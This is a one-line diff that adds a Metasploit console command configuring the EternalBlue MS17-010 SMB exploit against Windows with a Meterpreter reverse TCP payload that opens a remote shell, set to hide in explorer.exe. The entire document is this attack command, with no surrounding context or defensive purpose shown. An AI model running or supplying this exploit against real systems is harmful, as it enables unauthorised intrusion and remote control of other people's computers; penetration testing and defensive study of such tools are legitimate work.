@@ -1,0 +1,1 @@
+msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set payload windows/meterpreter/reverse_tcp;set ProcessName explorer.exe;show options"
